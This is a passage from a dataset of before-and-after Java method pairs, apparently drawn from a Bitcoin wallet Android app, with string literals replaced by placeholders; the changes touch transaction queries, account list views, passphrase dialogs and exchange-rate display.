      return new TransactionEx(hash,height,cursor.getInt(1),cursor.getBlob(2));
    }
    return null;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}","@Override public TransactionEx getTransaction(Sha256Hash txid){
  Cursor cursor=null;
  try {
    SQLiteQueryWithBlobs blobQuery=new SQLiteQueryWithBlobs(_db);
    blobQuery.bindBlob(1,txid.getBytes());
    cursor=blobQuery.query(false,txTableName,new String[]{""String_Node_Str"",""String_Node_Str"",""String_Node_Str""},""String_Node_Str"",null,null,null,null,null);
    if (cursor.moveToNext()) {
      int height=cursor.getInt(0);
      if (height == Integer.MAX_VALUE) {
        height=-1;
      }
      return new TransactionEx(txid,txid,height,cursor.getInt(1),cursor.getBlob(2));
    }
    return null;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}"
91010,"@Override public Collection<TransactionEx> getUnconfirmedTransactions(){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{});
    while (cursor.moveToNext()) {
      TransactionEx tex=new TransactionEx(new Sha256Hash(cursor.getBlob(0)),-1,cursor.getInt(1),cursor.getBlob(2));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}","@Override public Collection<TransactionEx> getUnconfirmedTransactions(){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{});
    while (cursor.moveToNext()) {
      Sha256Hash txid=new Sha256Hash(cursor.getBlob(0));
      TransactionEx tex=new TransactionEx(txid,txid,-1,cursor.getInt(1),cursor.getBlob(2));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}"
91011,"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setView();
  lvAccounts=(ListView)findViewById(R.id.lvAccounts);
  txtStatus=(TextView)findViewById(R.id.txtStatus);
  accountsAdapter=new AccountsAdapter(this,R.id.lvAccounts,accounts);
  lvAccounts.setAdapter(accountsAdapter);
  lvAccounts.setOnItemClickListener(accountClickListener());
  masterseedScanManager=initMasterseedManager();
  startBackgroundScan();
  updateUi();
}","@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setView();
  lvAccounts=findViewById(R.id.lvAccounts);
  txtStatus=findViewById(R.id.txtStatus);
  accountsAdapter=new AccountsAdapter(this,R.id.lvAccounts,accounts);
  lvAccounts.setAdapter(accountsAdapter);
  lvAccounts.setOnItemClickListener(accountClickListener());
  masterseedScanManager=initMasterseedManager();
  startBackgroundScan();
  updateUi();
}"
91012,"private AccountsAdapter(Context context,int resource,List<HdAccountWrapper> objects){
  super(context,resource,objects);
}","private AccountsAdapter(Context context,int resource,List<HdAccountWrapper> objects){
  super(context,resource,objects);
  inflater=LayoutInflater.from(getContext());
}"
91013,"@Override public View getView(int position,View convertView,ViewGroup parent){
  LayoutInflater inflater=(LayoutInflater)getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  View row;
  if (convertView == null) {
    row=inflater.inflate(R.layout.record_row,parent,false);
  }
 else {
    row=convertView;
  }
  HdAccountWrapper account=getItem(position);
  ((TextView)row.findViewById(R.id.tvLabel)).setText(account.name);
  WalletAccount walletAccount=MbwManager.getInstance(getContext()).getWalletManager(true).getAccount(account.id);
  Balance balance=walletAccount.getBalance();
  String balanceString=MbwManager.getInstance(getContext()).getBtcValueString(balance.confirmed + balance.pendingChange);
  if (balance.getSendingBalance() > 0) {
    balanceString+=""String_Node_Str"" + String.format(getString(R.string.account_balance_sending_amount),MbwManager.getInstance(getContext()).getBtcValueString(balance.getSendingBalance()));
  }
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,true,getResources());
  ((TextView)row.findViewById(R.id.tvBalance)).setText(balanceString);
  row.findViewById(R.id.tvAddress).setVisibility(View.GONE);
  ((ImageView)row.findViewById(R.id.ivIcon)).setImageDrawable(drawableForAccount);
  row.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  return row;
}","@Override public View getView(int position,View convertView,ViewGroup parent){
  View row;
  if (convertView == null) {
    row=inflater.inflate(R.layout.record_row,parent,false);
  }
 else {
    row=convertView;
  }
  HdAccountWrapper account=getItem(position);
  ((TextView)row.findViewById(R.id.tvLabel)).setText(account.name);
  WalletAccount walletAccount=MbwManager.getInstance(getContext()).getWalletManager(true).getAccount(account.id);
  Balance balance=walletAccount.getBalance();
  String balanceString=MbwManager.getInstance(getContext()).getBtcValueString(balance.confirmed + balance.pendingChange);
  if (balance.getSendingBalance() > 0) {
    balanceString+=""String_Node_Str"" + String.format(getString(R.string.account_balance_sending_amount),MbwManager.getInstance(getContext()).getBtcValueString(balance.getSendingBalance()));
  }
  Drawable drawableForAccount=Utils.getDrawableForAccount(walletAccount,true,getResources());
  ((TextView)row.findViewById(R.id.tvBalance)).setText(balanceString);
  row.findViewById(R.id.tvAddress).setVisibility(View.GONE);
  ((ImageView)row.findViewById(R.id.ivIcon)).setImageDrawable(drawableForAccount);
  row.findViewById(R.id.tvBackupMissingWarning).setVisibility(View.GONE);
  row.findViewById(R.id.tvAccountType).setVisibility(View.GONE);
  return row;
}"
91014,"public ViewAccountModel convert(WalletAccount walletAccount){
  ViewAccountModel result=new ViewAccountModel();
  result.accountId=walletAccount.getId();
  result.drawableForAccount=Utils.getDrawableForAccount(walletAccount,false,resources);
  result.drawableForAccountSelected=Utils.getDrawableForAccount(walletAccount,true,resources);
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked.getType() == WalletAccount.Type.COLU && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    result.isRMCLinkedAccount=true;
  }
  result.label=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        result.displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        result.displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        result.displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        result.displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (result.label.length() == 0) {
          result.displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          result.displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        result.displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    result.displayAddress=""String_Node_Str"";
  }
  result.isActive=walletAccount.isActive();
  if (result.isActive) {
    result.balance=walletAccount.getCurrencyBasedBalance();
    result.showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
  }
  return result;
}","public ViewAccountModel convert(WalletAccount walletAccount){
  ViewAccountModel result=new ViewAccountModel();
  result.accountId=walletAccount.getId();
  result.drawableForAccount=Utils.getDrawableForAccount(walletAccount,false,resources);
  result.drawableForAccountSelected=Utils.getDrawableForAccount(walletAccount,true,resources);
  result.accountType=walletAccount.getType();
  WalletAccount linked=Utils.getLinkedAccount(walletAccount,mbwManager.getColuManager().getAccounts().values());
  if (linked != null && linked.getType() == WalletAccount.Type.COLU && ((ColuAccount)linked).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC) {
    result.isRMCLinkedAccount=true;
  }
  result.label=mbwManager.getMetadataStorage().getLabelByAccount(walletAccount.getId());
  if (walletAccount.isActive()) {
    if (walletAccount instanceof Bip44PubOnlyAccount) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        result.displayAddress=resources.getString(R.string.contains_addresses,Integer.toString(numKeys));
      }
 else {
        result.displayAddress=resources.getString(R.string.account_contains_one_address_info);
      }
    }
 else     if (walletAccount instanceof Bip44Account) {
      int numKeys=((Bip44Account)walletAccount).getPrivateKeyCount();
      if (numKeys > 1) {
        result.displayAddress=resources.getString(R.string.contains_keys,Integer.toString(numKeys));
      }
 else {
        result.displayAddress=resources.getString(R.string.account_contains_one_key_info);
      }
    }
 else {
      Optional<Address> receivingAddress=walletAccount.getReceivingAddress();
      if (receivingAddress.isPresent()) {
        if (result.label.length() == 0) {
          result.displayAddress=receivingAddress.get().toMultiLineString();
        }
 else {
          result.displayAddress=receivingAddress.get().getShortAddress();
        }
      }
 else {
        result.displayAddress=""String_Node_Str"";
      }
    }
  }
 else {
    result.displayAddress=""String_Node_Str"";
  }
  result.isActive=walletAccount.isActive();
  if (result.isActive) {
    result.balance=walletAccount.getCurrencyBasedBalance();
    result.showBackupMissingWarning=showBackupMissingWarning(walletAccount,mbwManager);
  }
  return result;
}"
91015,"private void askForPassphrase(){
  if (usesPassphrase) {
    final EditText pass=new EditText(this);
    AlertDialog.Builder builder=new AlertDialog.Builder(this);
    builder.setTitle(R.string.type_password_title);
    builder.setView(pass).setCancelable(false).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
      public void onClick(      DialogInterface dialog,      int id){
        calculateSeed(pass.getText().toString());
      }
    }
).show();
  }
 else {
    calculateSeed(""String_Node_Str"");
  }
}","private void askForPassphrase(){
  if (usesPassphrase) {
    View view=LayoutInflater.from(this).inflate(R.layout.layout_password,null);
    final EditText pass=view.findViewById(R.id.et_password);
    AlertDialog.Builder builder=new AlertDialog.Builder(this,R.style.MyceliumModern_Dialog);
    builder.setTitle(R.string.type_password_title);
    builder.setView(view).setCancelable(false).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
      public void onClick(      DialogInterface dialog,      int id){
        calculateSeed(pass.getText().toString());
      }
    }
).show();
  }
 else {
    calculateSeed(""String_Node_Str"");
  }
}"
91016,"private void askForWordNumber(){
  final View checkBoxView=View.inflate(this,R.layout.wordlist_checkboxes,null);
  final CheckBox checkBox=(CheckBox)checkBoxView.findViewById(R.id.checkboxWordlistPassphrase);
  final RadioButton words12=(RadioButton)checkBoxView.findViewById(R.id.wordlist12);
  final RadioButton words18=(RadioButton)checkBoxView.findViewById(R.id.wordlist18);
  final RadioButton words24=(RadioButton)checkBoxView.findViewById(R.id.wordlist24);
  checkBox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener(){
    @Override public void onCheckedChanged(    CompoundButton compoundButton,    boolean b){
      if (b) {
        checkBoxView.findViewById(R.id.tvPassphraseInfo).setVisibility(View.VISIBLE);
      }
 else {
        checkBoxView.findViewById(R.id.tvPassphraseInfo).setVisibility(View.GONE);
      }
    }
  }
);
  AlertDialog.Builder builder=new AlertDialog.Builder(this);
  builder.setTitle(R.string.import_words_title);
  builder.setMessage(R.string.import_wordlist_questions).setView(checkBoxView).setCancelable(false).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface dialog,    int id){
      usesPassphrase=checkBox.isChecked();
      if (words12.isChecked()) {
        numberOfWords=12;
      }
 else       if (words18.isChecked()) {
        numberOfWords=18;
      }
 else       if (words24.isChecked()) {
        numberOfWords=24;
      }
 else {
        throw new IllegalStateException(""String_Node_Str"");
      }
      setHint();
    }
  }
).show();
}","private void askForWordNumber(){
  final View checkBoxView=View.inflate(this,R.layout.wordlist_checkboxes,null);
  final CheckBox checkBox=(CheckBox)checkBoxView.findViewById(R.id.checkboxWordlistPassphrase);
  final RadioButton words12=(RadioButton)checkBoxView.findViewById(R.id.wordlist12);
  final RadioButton words18=(RadioButton)checkBoxView.findViewById(R.id.wordlist18);
  final RadioButton words24=(RadioButton)checkBoxView.findViewById(R.id.wordlist24);
  checkBox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener(){
    @Override public void onCheckedChanged(    CompoundButton compoundButton,    boolean b){
      if (b) {
        checkBoxView.findViewById(R.id.tvPassphraseInfo).setVisibility(View.VISIBLE);
      }
 else {
        checkBoxView.findViewById(R.id.tvPassphraseInfo).setVisibility(View.GONE);
      }
    }
  }
);
  AlertDialog.Builder builder=new AlertDialog.Builder(this,R.style.MyceliumModern_Dialog);
  builder.setTitle(R.string.import_words_title);
  builder.setMessage(R.string.import_wordlist_questions).setView(checkBoxView).setCancelable(false).setPositiveButton(R.string.ok,new DialogInterface.OnClickListener(){
    public void onClick(    DialogInterface dialog,    int id){
      usesPassphrase=checkBox.isChecked();
      if (words12.isChecked()) {
        numberOfWords=12;
      }
 else       if (words18.isChecked()) {
        numberOfWords=18;
      }
 else       if (words24.isChecked()) {
        numberOfWords=24;
      }
 else {
        throw new IllegalStateException(""String_Node_Str"");
      }
      setHint();
    }
  }
).show();
}"
91017,"@SuppressLint(""String_Node_Str"") private void updateUi(){
  if (!isAdded()) {
    return;
  }
  if (_mbwManager.getSelectedAccount().isArchived()) {
    return;
  }
  WalletAccount account=Preconditions.checkNotNull(_mbwManager.getSelectedAccount());
  CurrencyBasedBalance balance;
  try {
    balance=Preconditions.checkNotNull(account.getCurrencyBasedBalance());
  }
 catch (  IllegalArgumentException ex) {
    _mbwManager.reportIgnoredException(ex);
    balance=CurrencyBasedBalance.ZERO_BITCOIN_BALANCE;
  }
  updateUiKnownBalance(balance);
  TextView tvBtcRate=_root.findViewById(R.id.tvBtcRate);
  if (account instanceof ColuAccount) {
    tvBtcRate.setVisibility(View.VISIBLE);
    ColuAccount coluAccount=(ColuAccount)account;
    ColuAccount.ColuAssetType assetType=coluAccount.getColuAsset().assetType;
    if (assetType == ColuAccount.ColuAssetType.RMC) {
      _tcdFiatDisplay.setVisibility(View.VISIBLE);
      CurrencyValue coluValue=ExactCurrencyValue.from(BigDecimal.ONE,coluAccount.getColuAsset().name);
      CurrencyValue fiatValue=CurrencyValue.fromValue(coluValue,_mbwManager.getFiatCurrency(),_mbwManager.getExchangeRateManager());
      if (fiatValue != null && fiatValue.getValue() != null) {
        tvBtcRate.setText(getString(R.string.rate,coluAccount.getColuAsset().name,Utils.formatFiatWithUnit(fiatValue)));
      }
      exchangeSource.setText(COINMARKETCAP + ""String_Node_Str"" + _mbwManager.getExchangeRateManager().getCurrentExchangeSourceName());
      exchangeSourceLayout.setVisibility(View.VISIBLE);
    }
 else     if (assetType == ColuAccount.ColuAssetType.MASS) {
      _tcdFiatDisplay.setVisibility(View.VISIBLE);
      CurrencyValue coluValue=ExactCurrencyValue.from(BigDecimal.ONE,coluAccount.getColuAsset().name);
      CurrencyValue fiatValue=CurrencyValue.fromValue(coluValue,_mbwManager.getFiatCurrency(),_mbwManager.getExchangeRateManager());
      if (fiatValue != null && fiatValue.getValue() != null) {
        tvBtcRate.setText(getString(R.string.rate,coluAccount.getColuAsset().name,Utils.formatFiatWithUnit(fiatValue,6)));
      }
      exchangeSourceLayout.setVisibility(View.GONE);
    }
 else {
      _tcdFiatDisplay.setVisibility(View.INVISIBLE);
      tvBtcRate.setText(getString(R.string.exchange_source_not_available,((ColuAccount)account).getColuAsset().name));
      exchangeSourceLayout.setVisibility(View.GONE);
    }
  }
 else   if (isBCH()) {
    CurrencyValue fiatValue=CurrencyValue.fromValue(ExactBitcoinCashValue.from(BigDecimal.ONE),_mbwManager.getFiatCurrency(),_mbwManager.getExchangeRateManager());
    if (_exchangeRatePrice == null) {
      tvBtcRate.setVisibility(View.VISIBLE);
      tvBtcRate.setText(R.string.exchange_rate_unavailable);
    }
 else {
      tvBtcRate.setText(getString(R.string.rate,""String_Node_Str"",Utils.formatFiatWithUnit(fiatValue)));
    }
    exchangeSourceLayout.setVisibility(View.GONE);
  }
 else {
    tvBtcRate.setVisibility(View.VISIBLE);
    _tcdFiatDisplay.setVisibility(View.VISIBLE);
    if (!_mbwManager.hasFiatCurrency()) {
      tvBtcRate.setVisibility(View.INVISIBLE);
      exchangeSourceLayout.setVisibility(View.GONE);
    }
 else     if (_exchangeRatePrice == null) {
      tvBtcRate.setVisibility(View.VISIBLE);
      tvBtcRate.setText(getResources().getString(R.string.exchange_source_not_available,_mbwManager.getExchangeRateManager().getCurrentExchangeSourceName()));
      exchangeSource.setText(_mbwManager.getExchangeRateManager().getCurrentExchangeSourceName());
      exchangeSourceLayout.setVisibility(View.VISIBLE);
    }
 else {
      tvBtcRate.setVisibility(View.VISIBLE);
      String currency=_mbwManager.getFiatCurrency();
      String converted=Utils.getFiatValueAsString(Constants.ONE_BTC_IN_SATOSHIS,_exchangeRatePrice);
      tvBtcRate.setText(getResources().getString(R.string.btc_rate,currency,converted));
      exchangeSource.setText(_mbwManager.getExchangeRateManager().getCurrentExchangeSourceName());
      exchangeSourceLayout.setVisibility(View.VISIBLE);
    }
  }
}","@SuppressLint(""String_Node_Str"") private void updateUi(){
  if (!isAdded()) {
    return;
  }
  if (_mbwManager.getSelectedAccount().isArchived()) {
    return;
  }
  WalletAccount account=Preconditions.checkNotNull(_mbwManager.getSelectedAccount());
  CurrencyBasedBalance balance;
  try {
    balance=Preconditions.checkNotNull(account.getCurrencyBasedBalance());
  }
 catch (  IllegalArgumentException ex) {
    _mbwManager.reportIgnoredException(ex);
    balance=CurrencyBasedBalance.ZERO_BITCOIN_BALANCE;
  }
  updateUiKnownBalance(balance);
  TextView tvBtcRate=_root.findViewById(R.id.tvBtcRate);
  if (account instanceof ColuAccount) {
    tvBtcRate.setVisibility(View.VISIBLE);
    ColuAccount coluAccount=(ColuAccount)account;
    ColuAccount.ColuAssetType assetType=coluAccount.getColuAsset().assetType;
    if (assetType == ColuAccount.ColuAssetType.RMC) {
      _tcdFiatDisplay.setVisibility(View.VISIBLE);
      CurrencyValue coluValue=ExactCurrencyValue.from(BigDecimal.ONE,coluAccount.getColuAsset().name);
      CurrencyValue fiatValue=CurrencyValue.fromValue(coluValue,_mbwManager.getFiatCurrency(),_mbwManager.getExchangeRateManager());
      if (fiatValue != null && fiatValue.getValue() != null) {
        tvBtcRate.setText(getString(R.string.rate,coluAccount.getColuAsset().name,Utils.formatFiatWithUnit(fiatValue)));
      }
      exchangeSource.setText(COINMARKETCAP + ""String_Node_Str"" + _mbwManager.getExchangeRateManager().getCurrentExchangeSourceName());
      exchangeSourceLayout.setVisibility(View.VISIBLE);
    }
 else     if (assetType == ColuAccount.ColuAssetType.MASS) {
      _tcdFiatDisplay.setVisibility(View.VISIBLE);
      CurrencyValue coluValue=ExactCurrencyValue.from(BigDecimal.ONE,coluAccount.getColuAsset().name);
      CurrencyValue fiatValue=CurrencyValue.fromValue(coluValue,_mbwManager.getFiatCurrency(),_mbwManager.getExchangeRateManager());
      if (fiatValue != null && fiatValue.getValue() != null) {
        tvBtcRate.setText(getString(R.string.rate,coluAccount.getColuAsset().name,Utils.formatFiatWithUnit(fiatValue,6)));
      }
      exchangeSourceLayout.setVisibility(View.GONE);
    }
 else {
      _tcdFiatDisplay.setVisibility(View.INVISIBLE);
      tvBtcRate.setText(getString(R.string.exchange_source_not_available,((ColuAccount)account).getColuAsset().name));
      exchangeSourceLayout.setVisibility(View.GONE);
    }
  }
 else   if (isBCH()) {
    CurrencyValue fiatValue=CurrencyValue.fromValue(ExactBitcoinCashValue.from(BigDecimal.ONE),_mbwManager.getFiatCurrency(),_mbwManager.getExchangeRateManager());
    if (fiatValue != null && fiatValue.getValue() != null) {
      tvBtcRate.setText(getString(R.string.rate,""String_Node_Str"",Utils.formatFiatWithUnit(fiatValue)));
    }
 else {
      tvBtcRate.setVisibility(View.VISIBLE);
      tvBtcRate.setText(R.string.exchange_rate_unavailable);
    }
    exchangeSourceLayout.setVisibility(View.GONE);
  }
 else {
    tvBtcRate.setVisibility(View.VISIBLE);
    _tcdFiatDisplay.setVisibility(View.VISIBLE);
    if (!_mbwManager.hasFiatCurrency()) {
      tvBtcRate.setVisibility(View.INVISIBLE);
      exchangeSourceLayout.setVisibility(View.GONE);
    }
 else     if (_exchangeRatePrice == null) {
      tvBtcRate.setVisibility(View.VISIBLE);
      tvBtcRate.setText(getResources().getString(R.string.exchange_source_not_available,_mbwManager.getExchangeRateManager().getCurrentExchangeSourceName()));
      exchangeSource.setText(_mbwManager.getExchangeRateManager().getCurrentExchangeSourceName());
      exchangeSourceLayout.setVisibility(View.VISIBLE);
    }
 else {
      tvBtcRate.setVisibility(View.VISIBLE);
      String currency=_mbwManager.getFiatCurrency();
      String converted=Utils.getFiatValueAsString(Constants.ONE_BTC_IN_SATOSHIS,_exchangeRatePrice);
      tvBtcRate.setText(getResources().getString(R.string.btc_rate,currency,converted));
      exchangeSource.setText(_mbwManager.getExchangeRateManager().getCurrentExchangeSourceName());
      exchangeSourceLayout.setVisibility(View.VISIBLE);
    }
  }
}"
91018,"public void onRadioButtonClicked(View view){
  boolean checked=((RadioButton)view).isChecked();
  ColuAssetType assetType;
  String name;
switch (view.getId()) {
case R.id.radio_mycelium_tokens:
    assetType=MT;
  name=""String_Node_Str"";
break;
case R.id.radio_mass_tokens:
assetType=MASS;
name=""String_Node_Str"";
break;
case R.id.radio_rmc_tokens:
assetType=RMC;
name=""String_Node_Str"";
break;
default :
return;
}
if (checked) {
selectedColuAsset=ColuAsset.getByType(assetType);
}
btColuAddAccount.setEnabled(true);
Toast.makeText(this,name + ""String_Node_Str"",Toast.LENGTH_SHORT).show();
}","@OnClick({R.id.radio_mycelium_tokens,R.id.radio_mass_tokens,R.id.radio_rmc_tokens}) public void onRadioButtonClicked(View view){
  boolean checked=((RadioButton)view).isChecked();
  ColuAssetType assetType;
  String name;
switch (view.getId()) {
case R.id.radio_mycelium_tokens:
    assetType=MT;
  name=""String_Node_Str"";
break;
case R.id.radio_mass_tokens:
assetType=MASS;
name=""String_Node_Str"";
break;
case R.id.radio_rmc_tokens:
assetType=RMC;
name=""String_Node_Str"";
break;
default :
return;
}
if (checked) {
selectedColuAsset=ColuAsset.getByType(assetType);
}
btColuAddAccount.setEnabled(true);
Toast.makeText(this,name + ""String_Node_Str"",Toast.LENGTH_SHORT).show();
}"
91019,"public void updateData(){
  itemList.clear();
  AccountManager am=AccountManager.INSTANCE;
  addGroup(R.string.active_hd_accounts_name,GROUP_TITLE_TYPE,am.getBTCBip44Accounts().values());
  addGroup(""String_Node_Str"",GROUP_TITLE_TYPE,am.getBTCSingleAddressAccounts().values());
  addGroup(R.string.bitcoin_cash_hd,GROUP_TITLE_TYPE,am.getBCHBip44Accounts().values());
  addGroup(R.string.bitcoin_cash_sa,GROUP_TITLE_TYPE,am.getBCHSingleAddressAccounts().values());
  List<WalletAccount> coluAccounts=new ArrayList<>();
  for (  WalletAccount walletAccount : am.getColuAccounts().values()) {
    coluAccounts.add(walletAccount);
    coluAccounts.add(((ColuAccount)walletAccount).getLinkedAccount());
  }
  addGroup(R.string.digital_assets,GROUP_TITLE_TYPE,coluAccounts);
  List<WalletAccount> accounts=am.getActiveAccounts().values().asList();
  List<WalletAccount> other=new ArrayList<>();
  for (  WalletAccount account : accounts) {
switch (account.getType()) {
case BTCSINGLEADDRESS:
case BTCBIP44:
case BCHSINGLEADDRESS:
case BCHBIP44:
case COLU:
      break;
default :
    other.add(account);
  break;
}
}
addGroup(R.string.active_other_accounts_name,GROUP_TITLE_TYPE,other);
itemList.add(new Item(TOTAL_BALANCE_TYPE,""String_Node_Str"",am.getActiveAccounts().values().asList()));
addGroup(R.string.archive_name,GROUP_ARCHIVED_TITLE_TYPE,am.getArchivedAccounts().values());
notifyDataSetChanged();
}","public void updateData(){
  itemList.clear();
  AccountManager am=AccountManager.INSTANCE;
  addGroup(R.string.active_hd_accounts_name,GROUP_TITLE_TYPE,am.getBTCBip44Accounts().values());
  addGroup(context.getString(R.string.active_bitcoin_sa_group_name),GROUP_TITLE_TYPE,am.getBTCSingleAddressAccounts().values());
  addGroup(R.string.bitcoin_cash_hd,GROUP_TITLE_TYPE,am.getBCHBip44Accounts().values());
  addGroup(R.string.bitcoin_cash_sa,GROUP_TITLE_TYPE,am.getBCHSingleAddressAccounts().values());
  List<WalletAccount> coluAccounts=new ArrayList<>();
  for (  WalletAccount walletAccount : am.getColuAccounts().values()) {
    coluAccounts.add(walletAccount);
    coluAccounts.add(((ColuAccount)walletAccount).getLinkedAccount());
  }
  addGroup(R.string.digital_assets,GROUP_TITLE_TYPE,coluAccounts);
  List<WalletAccount> accounts=am.getActiveAccounts().values().asList();
  List<WalletAccount> other=new ArrayList<>();
  for (  WalletAccount account : accounts) {
switch (account.getType()) {
case BTCSINGLEADDRESS:
case BTCBIP44:
case BCHSINGLEADDRESS:
case BCHBIP44:
case COLU:
      break;
default :
    other.add(account);
  break;
}
}
addGroup(R.string.active_other_accounts_name,GROUP_TITLE_TYPE,other);
itemList.add(new Item(TOTAL_BALANCE_TYPE,""String_Node_Str"",am.getActiveAccounts().values().asList()));
addGroup(R.string.archive_name,GROUP_ARCHIVED_TITLE_TYPE,am.getArchivedAccounts().values());
notifyDataSetChanged();
}"
91020,"@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  final Item item=itemList.get(position);
  int viewType=item.type;
  if (viewType == ACCOUNT_TYPE) {
    AccountViewHolder accountHolder=(AccountViewHolder)holder;
    final WalletAccount account=item.walletAccount;
    builder.buildRecordView(null,account,mbwManager.getSelectedAccount() == account,focusedAccount == account,holder.itemView);
    accountHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemSelectListener != null) {
          itemSelectListener.onClick(account);
        }
      }
    }
);
    accountHolder.llAddress.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemClickListener != null) {
          itemClickListener.onItemClick(account);
        }
      }
    }
);
  }
 else   if (viewType == GROUP_TITLE_TYPE) {
    GroupTitleViewHolder groupHolder=(GroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      groupHolder.tvBalance.setValue(sum);
      groupHolder.tvBalance.setVisibility(View.VISIBLE);
    }
 else {
      groupHolder.tvBalance.setVisibility(View.GONE);
    }
  }
 else   if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    ArchivedGroupTitleViewHolder groupHolder=(ArchivedGroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
  }
 else   if (viewType == TOTAL_BALANCE_TYPE) {
    TotalViewHolder totalHolder=(TotalViewHolder)holder;
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      totalHolder.tcdBalance.setValue(sum);
    }
  }
}","@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  final Item item=itemList.get(position);
  int viewType=item.type;
  if (viewType == ACCOUNT_TYPE) {
    AccountViewHolder accountHolder=(AccountViewHolder)holder;
    final WalletAccount account=item.walletAccount;
    builder.buildRecordView(null,account,mbwManager.getSelectedAccount() == account,focusedAccount == account,holder.itemView);
    accountHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemSelectListener != null) {
          itemSelectListener.onClick(account);
        }
      }
    }
);
    accountHolder.llAddress.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        setFocusedAccount(account);
        if (itemClickListener != null) {
          itemClickListener.onItemClick(account);
        }
      }
    }
);
  }
 else   if (viewType == GROUP_TITLE_TYPE) {
    GroupTitleViewHolder groupHolder=(GroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
    int count=item.walletAccountList.size();
    groupHolder.tvAccountsCount.setVisibility(count > 0 ? View.VISIBLE : View.GONE);
    groupHolder.tvAccountsCount.setText(""String_Node_Str"" + count + ""String_Node_Str"");
    groupHolder.itemView.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        boolean isGroupVisible=!pagePrefs.getBoolean(item.title,true);
        pagePrefs.edit().putBoolean(item.title,isGroupVisible).apply();
        updateData();
      }
    }
);
    groupHolder.expandIcon.setRotation(pagePrefs.getBoolean(item.title,true) ? 180 : 0);
    CurrencySum sum=getSpendableBalance(item.walletAccountList);
    if (sum != null) {
      groupHolder.tvBalance.setValue(sum);
      groupHolder.tvBalance.setVisibility(View.VISIBLE);
    }
 else {
      groupHolder.tvBalance.setVisibility(View.GONE);
    }
  }
 else   if (viewType == GROUP_ARCHIVED_TITLE_TYPE) {
    ArchivedGroupTitleViewHolder groupHolder=(ArchivedGroupTitleViewHolder)holder;
    groupHolder.tvTitle.setText(Html.fromHtml(item.title));
